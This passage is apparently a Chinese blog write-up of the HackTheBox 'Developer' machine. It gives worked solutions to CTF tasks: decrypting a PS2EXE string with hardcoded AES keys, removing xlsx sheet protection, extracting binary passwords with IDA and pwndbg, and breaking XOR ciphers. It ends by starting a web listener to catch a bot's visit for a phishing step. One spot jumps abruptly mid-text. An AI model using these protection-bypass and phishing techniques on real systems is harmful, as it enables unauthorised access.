p\u003e题目会给出一个\u003ccode\u003eEXE\u003c/code\u003e文件合一串加密后的字符串：\u003ccode\u003eX/o8VJQE1pyQhjmpcwk45+L069bivpF63PjZP4z7ahKaC+jv89NT6ze0T5id0lWC\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e对程序进行反编译，在\u003ccode\u003ePS2EXE\u003c/code\u003e中的\u003ccode\u003eMain\u003c/code\u003e中能找到一串\u003ccode\u003ebase64\u003c/code\u003e编码后的字符串\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Developer/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e解码后是加密的逻辑，通过\u003ccode\u003eAI\u003c/code\u003e写出解密脚本即可\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-comment\"\u003e# ===================================================================\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# Decryption Script for FullCrypto\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# We are reversing the logic from the original Encrypt-String function\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# ===================================================================\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# 加载必要的程序集\u003c/span\u003e\n[void] [System.Reflection.Assembly]::LoadWithPartialName(\u003cspan class=\"hljs-string\"\u003e\"System.Security\"\u003c/span\u003e)\nAdd-Type -AssemblyName System.Security\n\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e Decrypt-String(\u003cspan class=\"hljs-variable\"\u003e$base64String\u003c/span\u003e) {\n    \u003cspan class=\"hljs-comment\"\u003e# --- 这些是我们在原脚本中找到的硬编码秘密 ---\u003c/span\u003e\n    \u003cspan class=\"hljs-variable\"\u003e$Passphrase\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e\"AmazinglyStrongPassword\"\u003c/span\u003e\n    \u003cspan class=\"hljs-variable\"\u003e$salt\u003c/span\u003e       = \u003cspan class=\"hljs-string\"\u003e\"CrazilySimpleSalt\"\u003c/span\u003e\n    \u003cspan class=\"hljs-variable\"\u003e$init\u003c/span\u003e       = \u003cspan class=\"hljs-string\"\u003e\"StupidlyEasy_IV\"\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e# ----------------------------------------------\u003c/span\u003e\n\n    \u003cspan class=\"hljs-comment\"\u003e# 1. 准备 Rijndael (AES) 对象\u003c/span\u003e\n    \u003cspan class=\"hljs-variable\"\u003e$r\u003c/span\u003e = New-Object System.Security.Cryptography.RijndaelManaged\n\n    \u003cspan class=\"hljs-comment\"\u003e# 2. 准备密码和盐值的字节数组 (必须和加密时完全一样)\u003c/span\u003e\n    \u003cspan class=\"hljs-variable\"\u003e$passBytes\u003c/span\u003e = [System.Text.Encoding]::UTF8.GetBytes(\u003cspan class=\"hljs-variable\"\u003e$Passphrase\u003c/span\u003e)\n    \u003cspan class=\"hljs-variable\"\u003e$saltBytes\u003c/span\u003e = [System.Text.Encoding]::UTF8.GetBytes(\u003cspan class=\"hljs-variable\"\u003e$salt\u003c/span\u003e)\n\n    \u003cspan class=\"hljs-comment\"\u003e# 3. 生成密钥 (必须和加密时完全一样)\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e# 使用 PasswordDeriveBytes, SHA1, 5次迭代, 生成32字节密钥\u003c/span\u003e\n    \u003cspan class=\"hljs-variable\"\u003e$r\u003c/span\u003e.Key = (New-Object System.Security.Cryptography.PasswordDeriveBytes \u003cspan class=\"hljs-variable\"\u003e$passBytes\u003c/span\u003e, \u003cspan class=\"hljs-variable\"\u003e$saltBytes\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"SHA1\"\u003c/span\u003e, 5).GetBytes(32)\n\n    \u003cspan class=\"hljs-comment\"\u003e# 4. 生成 IV (必须和加密时完全一样)\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e# 计算 IV 种子的 SHA1 哈希，并取前16个字节\u003c/span\u003e\n    \u003cspan class=\"hljs-variable\"\u003e$r\u003c/span\u003e.IV = (New-Object System.Security.Cryptography.SHA1Managed).ComputeHash([System.Text.Encoding]::UTF8.GetBytes(\u003cspan class=\"hljs-variable\"\u003e$init\u003c/span\u003e))[0..15]\n\n    \u003cspan class=\"hljs-comment\"\u003e# 5. 从 Base64 字符串解码出加密后的字节数组\u003c/span\u003e\n    try {\n        \u003cspan class=\"hljs-variable\"\u003e$encryptedBytes\u003c/span\u003e = [System.Convert]::FromBase64String(\u003cspan class=\"hljs-variable\"\u003e$base64String\u003c/span\u003e)\n    } catch {\n        Write-Error \u003cspan class=\"hljs-string\"\u003e\"Invalid Base64 string. Cannot decrypt.\"\u003c/span\u003e\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e\n    }\n\n    \u003cspan class=\"hljs-comment\"\u003e# 6. 创建解密器并执行解密\u003c/span\u003e\n    \u003cspan class=\"hljs-variable\"\u003e$c\u003c/span\u003e = \u003cspan class=\"hljs-variable\"\u003e$r\u003c/span\u003e.CreateDecryptor()\n    \u003cspan class=\"hljs-variable\"\u003e$ms\u003c/span\u003e = New-Object System.IO.MemoryStream @(,\u003cspan class=\"hljs-variable\"\u003e$encryptedBytes\u003c/span\u003e)\n    \u003cspan class=\"hljs-variable\"\u003e$cs\u003c/span\u003e = New-Object System.Security.Cryptography.CryptoStream \u003cspan class=\"hljs-variable\"\u003e$ms\u003c/span\u003e, \u003cspan class=\"hljs-variable\"\u003e$c\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"Read\"\u003c/span\u003e\n    \u003cspan class=\"hljs-variable\"\u003e$sr\u003c/span\u003e = New-Object System.IO.StreamReader \u003cspan class=\"hljs-variable\"\u003e$cs\u003c/span\u003e\n\n    \u003cspan class=\"hljs-comment\"\u003e# 7. 读取解密后的明文\u003c/span\u003e\n    \u003cspan class=\"hljs-variable\"\u003e$decryptedString\u003c/span\u003e = \u003cspan class=\"hljs-variable\"\u003e$sr\u003c/span\u003e.ReadToEnd()\n\n    \u003cspan class=\"hljs-comment\"\u003e# 8. 清理资源并返回结果\u003c/span\u003e\n    \u003cspan class=\"hljs-variable\"\u003e$sr\u003c/span\u003e.Close()\n    \u003cspan class=\"hljs-variable\"\u003e$cs\u003c/span\u003e.Close()\n    \u003cspan class=\"hljs-variable\"\u003e$ms\u003c/span\u003e.Close()\n    \u003cspan class=\"hljs-variable\"\u003e$r\u003c/span\u003e.Clear()\n\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-variable\"\u003e$decryptedString\u003c/span\u003e\n}\n\n\u003cspan class=\"hljs-comment\"\u003e# --- 使用方法 ---\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# 将你在挑战中得到的加密字符串替换到下面的变量中\u003c/span\u003e\n\u003cspan class=\"hljs-variable\"\u003e$encryptedData\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e\"这里放你要解密的Base64字符串\"\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# 调用解密函数\u003c/span\u003e\n\u003cspan class=\"hljs-variable\"\u003e$decryptedResult\u003c/span\u003e = Decrypt-String -base64String \u003cspan class=\"hljs-variable\"\u003e$encryptedData\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# 输出解密结果\u003c/span\u003e\nWrite-Host \u003cspan class=\"hljs-string\"\u003e\"Decryption Result:\"\u003c/span\u003e -ForegroundColor Green\nWrite-Host \u003cspan class=\"hljs-variable\"\u003e$decryptedResult\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ePS D:\\System\\Downloads\\20250620\u003e .\\pass.ps1\nDecryption Result:\nDHTB{P0w3rsh3lL_F0r3n51c_M4dn3s5}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003ePhished List\u003c/h3\u003e\n\u003cp\u003e给一个\u003ccode\u003exlsx\u003c/code\u003e文件，听说文档中包含密码\u003c/p\u003e\n\u003cp\u003e像是隐写题，上网搜索了下，\u003ccode\u003edocs\u003c/code\u003e和\u003ccode\u003exlsx\u003c/code\u003e基本上就是\u003ccode\u003ezip\u003c/code\u003e文件，我们对其进行解压\u003c/p\u003e\n\u003cp\u003e然后找到 \u003ccode\u003ephished_credentials\\xl\\worksheets\\sheet1.xml\u003c/code\u003e ,在最底下能找到\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u0026#x3C;sheetProtection \nalgorithmName=\u003cspan class=\"hljs-string\"\u003e\"SHA-512\"\u003c/span\u003e \nhashValue=\u003cspan class=\"hljs-string\"\u003e\"Y4Ko7kZUKStIxaVGWEtuMeRdnCiN7O3D8qZtKdo/2jP7WE6yzKQXUcSWQ/E0OrqHCzhOBFX+t8Db5Pxaiu+N1g==\"\u003c/span\u003e \nsaltValue=\u003cspan class=\"hljs-string\"\u003e\"EoiHQklf0FagPs+iW0OzkA==\"\u003c/span\u003e \nspinCount=\u003cspan class=\"hljs-string\"\u003e\"100000\"\u003c/span\u003e \nsheet=\u003cspan class=\"hljs-string\"\u003e\"1\"\u003c/span\u003e \nobjects=\u003cspan class=\"hljs-string\"\u003e\"1\"\u003c/span\u003e \nscenarios=\u003cspan class=\"hljs-string\"\u003e\"1\"\u003c/span\u003e/\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们将 \u003ccode\u003esheet1.xml\u003c/code\u003e 的\u003ccode\u003esheetProtection\u003c/code\u003e 块删掉后，再放进去替换掉原本的 \u003ccode\u003esheet1.xml\u003c/code\u003e 即可\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Developer/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eDHTB{H1dD3N_C0LuMn5_FtW}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eLucky Guess\u003c/h3\u003e\n\u003cp\u003e压缩包解压后是一个程序，我们直接\u003ccode\u003eIDA\u003c/code\u003e打开\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ewinner\u003c/code\u003e函数\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Developer/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eAI\u003c/code\u003e编写异或脚本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-comment\"\u003e# C 代码中的变量\u003c/span\u003e\nkey = \u003cspan class=\"hljs-string\"\u003e\"98hKjr3f8CgfF\"\u003c/span\u003e\nciphertext = \u003cspan class=\"hljs-string\"\u003e\"^w!%-%z2p7/# uw?\"\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# 用于存放解密结果的变量\u003c/span\u003e\nplaintext = \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# 遍历密文中的每一个字符\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e i \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e range(len(ciphertext)):\n    \u003cspan class=\"hljs-comment\"\u003e# 1. 取出密文字符和对应的密钥字符\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e#    使用模运算 (%) 来实现密钥的循环使用\u003c/span\u003e\n    cipher_char = ciphertext[i]\n    key_char = key[i % len(key)]\n    \n    \u003cspan class=\"hljs-comment\"\u003e# 2. 进行异或 (XOR) 运算\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e#    ord() 获取字符的ASCII码，^ 是异或操作符\u003c/span\u003e\n    decrypted_char_code = ord(cipher_char) ^ ord(key_char)\n    \n    \u003cspan class=\"hljs-comment\"\u003e# 3. 应用特殊处理规则\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e decrypted_char_code \u0026#x3C;= 31:\n        decrypted_char_code += 32\n        \n    \u003cspan class=\"hljs-comment\"\u003e# 4. 将解密后的ASCII码转换回字符，并拼接到结果字符串中\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e#    chr() 将ASCII码转为字符\u003c/span\u003e\n    plaintext += chr(decrypted_char_code)\n\n\u003cspan class=\"hljs-comment\"\u003e# 按照格式输出最终的 Flag\u003c/span\u003e\nflag = f\u003cspan class=\"hljs-string\"\u003e\"DHTB{{{plaintext}}}\"\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(flag)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Developer python getpass.py                                              \nDHTB{gOInGWITHtHEfLOW}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eAuthenication\u003c/h3\u003e\n\u003cp\u003eI developed a new authentication mechanism using rust. Can you reverse my password?\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003erust\u003c/code\u003e 逆向\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Developer ./authenticate                                    \nWelcome to TheCyberGeek\u003cspan class=\"hljs-string\"\u003e's authentication platform\nEnter the password to proceed: \nsdadad\nYou are unauthorized to use this application!\n➜  Developer file authenticate \nauthenticate: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=95ac617025cf1bfe1e6749172a7888dfc4fe4dfe, for GNU/Linux 3.2.0, with debug_info, not stripped\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e进去要你输入密码然后验证，\u003ccode\u003eIDA\u003c/code\u003e打开，找到验证的部分\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Developer/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e其中的这行代码正在执行 \u003ccode\u003ev3 == v5\u003c/code\u003e 的比较，并把结果（\u003ccode\u003etrue\u003c/code\u003e 或 \u003ccode\u003efalse\u003c/code\u003e）存起来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eHIBYTE(v2.pieces.data_ptr) = core::cmp::impls::_$LT$impl$u20\u003cspan class=\"hljs-variable\"\u003e$core\u003c/span\u003e..cmp..PartialEq$LT$$RF$B$GT$$u20$\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e$u20$$RF$A$GT$::eq::h372d5aaf05c06316(\n                                 \u0026#x26;v3,\n                                 \u0026#x26;v5);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e其中一个应该是用户输入的，然后和\u003ccode\u003ev3\u003c/code\u003e 或者 \u003ccode\u003ev5\u003c/code\u003e 去比较，所以我们要在\u003ccode\u003ev3\u003c/code\u003e或者\u003ccode\u003ev5\u003c/code\u003e 处断点，就可以看到是和什么在对比\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Developer pwndbg authenticate \nReading symbols from authenticate...\npwndbg: loaded 190 pwndbg commands. Type pwndbg [filter] \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e a list.\npwndbg: created 13 GDB \u003cspan class=\"hljs-built_in\"\u003efunctions\u003c/span\u003e (can be used with \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e/break). Type \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e to see them.\n------- tip of the day (\u003cspan class=\"hljs-built_in\"\u003edisable\u003c/span\u003e with \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e show-tips off) -------\nIf you want Pwndbg to clear screen on each \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e (but still save previous output \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ehistory\u003c/span\u003e) use \u003cspan cla 003e\"门赖旅惫杀緝\"\u003c/span\u003e);\n  v6 = v3;\n  \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e ( *v6 )\n  {\n    v1 = v6++;\n    *v1 -= 80;\n  }\n  strcpy(dest, a1);\n  strcpy(s2, v3);\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( !strcmp(dest, s2) )\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e 1;\n  \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e v7;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003ea1\u003c/code\u003e是我们的键入的参数，主要的解密逻辑是在：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e  \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e ( *v6 )\n  {\n    v1 = v6++;\n    *v1 -= 80;\n  }\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e程序遍历这个神秘字符串（\u003ccode\u003ev3\u003c/code\u003e）的每一个字节，并将每个字节的值减去 \u003ccode\u003e80\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e但是最后还是会在\u003ccode\u003eif ( !strcmp(dest, s2) )\u003c/code\u003e 处进行对比，我们还是在那断点，查看一下寄存器的值\u003c/p\u003e\n\u003cp\u003e我们要在\u003ccode\u003e0x00000000000011de\u003c/code\u003e 处断点\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e0x00000000000011d8 \u0026#x3C;+131\u003e:   mov    rsi,rdx\n0x00000000000011db \u0026#x3C;+134\u003e:   mov    rdi,rax\n0x00000000000011de \u0026#x3C;+137\u003e:   call   0x1050 \u0026#x3C;strcmp@plt\u003e\n0x00000000000011e3 \u0026#x3C;+142\u003e:   \u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e   eax,eax\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e和之前一样，因为有\u003ccode\u003eALSR\u003c/code\u003e，所以我们要在\u003ccode\u003emain\u003c/code\u003e处断点\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e ► 0x5555555551f7 \u0026#x3C;main+4\u003e      sub    rsp, 0x30                       RSP =\u003e 0x7fffffffdf30 (0x7fffffffdf60 - 0x30)\n   0x5555555551fb \u0026#x3C;main+8\u003e      mov    dword ptr [rbp - 0x24], edi     [0x7fffffffdf3c] \u0026#x3C;= 1\n   0x5555555551fe \u0026#x3C;main+11\u003e     mov    qword ptr [rbp - 0x30], rsi     [0x7fffffffdf30] \u0026#x3C;= 0x7fffffffe078 —▸ 0x7fffffffe372 ◂— \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/HackTheBox/Developer/pwnme'\u003c/span\u003e\n   0x555555555202 \u0026#x3C;main+15\u003e     cmp    dword ptr [rbp - 0x24], 1       1 - 1     EFLAGS =\u003e 0x246 [ cf PF af ZF sf IF \u003cspan class=\"hljs-built_in\"\u003edf\u003c/span\u003e of ac ]\n   0x555555555206 \u0026#x3C;main+19\u003e   ✘ jg     main+38                     \u0026#x3C;main+38\u003e\n \n   0x555555555208 \u0026#x3C;main+21\u003e     lea    rdi, [rip + 0xdf9]              RDI =\u003e 0x555555556008 ◂— \u003cspan class=\"hljs-string\"\u003e'Please enter your password as a program argument!'\u003c/span\u003e\n   0x55555555520f \u0026#x3C;main+28\u003e     call   puts@plt                    \u0026#x3C;puts@plt\u003e\n \n   0x555555555214 \u0026#x3C;main+33\u003e     jmp    main+175                    \u0026#x3C;main+175\u003e\n    ↓\n   0x5555555552a2 \u0026#x3C;main+175\u003e    mov    eax, 0     EAX =\u003e 0\n   0x5555555552a7 \u0026#x3C;main+180\u003e    leave  \n   0x5555555552a8 \u0026#x3C;main+181\u003e    ret    \n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epwndbg\u003e b *0x5555555551de\nBreakpoint 2 at 0x5555555551de\npwndbg\u003e c                                  \nContinuing.                                                                                                       \n                                                                                                                  \nBreakpoint 2, 0x00005555555551de \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e check_password ()                                                             \nLEGEND: STACK | HEAP | CODE | DATA | WX | RODATA \n───────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────────────\n*RAX  0x7fffffffdef0 ◂— 0x9700333231 /* \u003cspan class=\"hljs-string\"\u003e'123'\u003c/span\u003e */                                                                  \n RBX  0x7fffffffe068 —▸ 0x7fffffffe36e ◂— \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/HackTheBox/Developer/pwnme'\u003c/span\u003e\n*RCX  0x336e6179696173                                                                                                                                                                                                              \n*RDX  0x7fffffffdee0 ◂— \u003cspan class=\"hljs-string\"\u003e'supersaiyan3'\u003c/span\u003e  \n*RDI  0x7fffffffdef0 ◂— 0x9700333231 /* \u003cspan class=\"hljs-string\"\u003e'123'\u003c/span\u003e */\n*RSI  0x7fffffffdee0 ◂— \u003cspan class=\"hljs-string\"\u003e'supersaiyan3'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们能看到寄存器上的值是\u003ccode\u003esupersaiyan3\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Developer ./pwnme supersaiyan3           \nPassword correct. Here\u003cspan class=\"hljs-string\"\u003e's a flag:\nDHTB{b4s1c0v3rF7ow}\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eEsay Encryption\u003c/h3\u003e\n\u003cp\u003e需要解密\u003ccode\u003eDRwdFjIMJiYgOi4dOhI8OjQ=\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e下载会给出一个异或脚本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-meta\"\u003e#!/usr/bin/python3\u003c/span\u003e\nfrom itertools import izip, cycle\nimport \u003cspan class=\"hljs-built_in\"\u003ebase64\u003c/span\u003e\n\ndef xor_crypt_string(data, key=\u003cspan class=\"hljs-string\"\u003e'**'\u003c/span\u003e):\n    xored = \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e.\u003cspan class=\"hljs-built_in\"\u003ejoin\u003c/span\u003e(chr(ord(x) ^ ord(y)) \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (x,y) \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e izip(data, cycle(key)))\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e base64.encodestring(xored).strip()\n\nsecret_data = \u003cspan class=\"hljs-string\"\u003e\"\u0026#x3C;REDACTED\u003e\"\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e xor_crypt_string(secret_data)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是我们不知道\u003ccode\u003ekey\u003c/code\u003e是什么，但是我们能知道前五位是 \u003ccode\u003eDHTB{\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Developer/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们反过来即可得到\u003ccode\u003eflag\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Developer/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003eTriple Whammy\u003c/h3\u003e\n\u003cp\u003eWe've been told these keys hold a secret message, can you decode it?\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ec249e41fc6ee70a6c72d0441360cd7714f56b95f08edfce23e\nfb9c2b4b0b07422617884a2ac6e4ea4cbf72563bd55b33894b\n7d9d9b16b6b15df288ca3c339f9a7b489e629a0a9bc3a1167f\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e解压后得到的脚本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eimport os\nfrom secret import flag\n\ndef bxor(ba1, ba2):\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e bytes([_a ^ _b \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e _a, _b \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e zip(ba1, ba2)])\n\nkey1 = os.urandom(len(flag))\nkey2 = os.urandom(len(flag))\n\nct1 = bxor(key1, flag)\nct2 = bxor(ct1, key2)\nct3 = bxor(key2, flag)\n\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(ct1.hex())\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(ct2.hex())\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(ct3.hex())\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eAI\u003c/code\u003e一把梭哈\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-meta\"\u003e#!/usr/bin/python3\u003c/span\u003e\n\ndef bxor(ba1, ba2):\n    \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"Performs a byte-wise XOR operation on two byte strings.\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e bytes([_a ^ _b \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e _a, _b \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e zip(ba1, ba2)])\n\n\u003cspan class=\"hljs-comment\"\u003e# 1. 从题目中获取的三个十六进制密文\u003c/span\u003e\nhex_ct1 = \u003cspan class=\"hljs-string\"\u003e\"c249e41fc6ee70a6c72d0441360cd7714f56b95f08edfce23e\"\u003c/span\u003e\nhex_ct2 = \u003cspan class=\"hljs-string\"\u003e\"fb9c2b4b0b07422617884a2ac6e4ea4cbf72563bd55b33894b\"\u003c/span\u003e\nhex_ct3 = \u003cspan class=\"hljs-string\"\u003e\"7d9d9b16b6b15df288ca3c339f9a7b489e629a0a9bc3a1167f\"\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# 2. 将十六进制字符串转换为字节（bytes）对象\u003c/span\u003e\nct1 = bytes.fromhex(hex_ct1)\nct2 = bytes.fromhex(hex_ct2)\nct3 = bytes.fromhex(hex_ct3)\n\n\u003cspan class=\"hljs-comment\"\u003e# 3. 根据推导，将三个密文全部异或\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# flag = ct1 ^ ct2 ^ ct3\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# 我们可以分两步来完成\u003c/span\u003e\ntemp_xor_result = bxor(ct1, ct2)\nflag_bytes = bxor(temp_xor_result, ct3)\n\n\u003cspan class=\"hljs-comment\"\u003e# 4. 将恢复的字节数据解码为UTF-8字符串并打印\u003c/span\u003e\ntry:\n    flag = flag_bytes.decode(\u003cspan class=\"hljs-string\"\u003e'utf-8'\u003c/span\u003e)\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"🎉 Flag has been successfully recovered!\"\u003c/span\u003e)\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"[*] Flag: {flag}\"\u003c/span\u003e)\nexcept UnicodeDecodeError:\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"❌ Could not decode the result as a UTF-8 string.\"\u003c/span\u003e)\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"[*] Raw bytes (hex): {flag_bytes.hex()}\"\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e🎉 Flag has been successfully recovered!\n[*] Flag: DHTB{XorXorXorFunFunFun}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e钓鱼攻击\u003c/h2\u003e\n\u003cp\u003e其实做完一道题就可以继续打了\u003c/p\u003e\n\u003cp\u003e做完后有一个提交\u003ccode\u003ewriteup\u003c/code\u003e的输入框\u003c/p\u003e\n\u003cp\u003e我们开启\u003ccode\u003eWeb\u003c/code\u003e服务器，并提交改地址上去，看是否有人会访问\u003c/p\u003e\n\u003cp\u003e不一会就有回显了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Developer python -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.11.103 - - [21/Jun/2025 18:53:48] \u003cspan class=\"hljs-string\"\u003e\"GET / HTTP/1.1\"\u003c/span\u003e 200 -\n10.10.11.103 - - [21/Jun/2025 18:53:49] code 404, message File not found\n10.10.11.103 - - [21/Jun/2025 18:53:49] \u003cspan class=\"hljs-string\"\u003e\"GET /favicon.ico HTTP/1.1\"\u003c/span\u003e 404 